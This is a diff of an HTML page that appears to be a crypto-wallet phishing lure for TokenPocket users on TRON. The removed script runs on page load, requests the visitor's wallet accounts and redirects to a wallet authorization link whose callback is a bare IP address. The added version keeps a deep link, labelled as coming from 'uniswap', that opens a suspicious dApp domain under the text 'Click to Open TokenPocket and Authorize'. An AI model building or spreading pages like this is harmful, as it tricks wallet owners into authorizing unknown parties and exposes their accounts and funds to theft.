@@ -3,63 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TokenPocket Auto Connect</title>
+    <title>Open TokenPocket DApp</title>
 </head>
 <body>
-    <h1>Connecting to TokenPocket...</h1>
-    <a href='tpdapp://open?params={"url": "https://www.pihksale.finance/12s/tp", "chain": "TRON", "source": "uniswap" }'>Open TokenPocket to open DApp</a><br/>
-
-    <script>
-        async function autoConnectAndAuthorize() {
-            // 自动检测并连接 TokenPocket
-            if (typeof window.tronLink === 'undefined') {
-                alert('请通过 TokenPocket 打开该页面！');
-                return;
-            }
-
-            try {
-                const tronLink = window.tronLink;
-                const tronWeb = tronLink.tronWeb;
-
-                if (!tronWeb || !tronWeb.ready) {
-                    alert('TokenPocket 钱包尚未准备好。');
-                    return;
-                }
-
-                // 请求钱包连接（自动连接用户钱包）
-                const accounts = await tronWeb.request({ method: 'tron_requestAccounts' });
-                if (accounts.length === 0) {
-                    alert('未找到用户账户，请检查 TokenPocket 钱包设置。');
-                    return;
-                }
-
-                // 自动进行授权操作
-                const param = {
-                    "callbackUrl": "http://115.205.0.178:9011/taaBizApi/taaInitData",
-                    "action": "login",
-                    "actionId": "1648522106711",
-                    "blockchain": "tron",
-                    "dappIcon": "https://eosknights.io/img/icon.png",
-                    "dappName": "zs",
-                    "protocol": "TokenPocket",
-                    "version": "2.0"
-                };
-
-                // 对 param 进行 encode
-                const encodedParam = encodeURIComponent(JSON.stringify(param));
-
-                // 构建授权链接并重定向到 TokenPocket 的授权页面
-                const authUrl = `tpoutside://pull.activity?param=${encodedParam}`;
-                window.location.href = authUrl;
-
-            } catch (error) {
-                console.error('连接钱包失败:', error);
-                alert('连接钱包时发生错误，请查看控制台。');
-            }
-        }
-
-        // 页面加载时自动调用
-        window.addEventListener('load', autoConnectAndAuthorize);
-    </script>
+    <h1>Open TokenPocket</h1>
+    <!-- 点击此链接以自动打开 TokenPocket 并加载 DApp -->
+    <a href='tpdapp://open?params={"url": "https://www.pihksale.finance/12s/static/new", "chain": "TRON", "source": "uniswap" }'>
+        Click to Open TokenPocket and Authorize
+    </a>
 </body>
 </html>
+
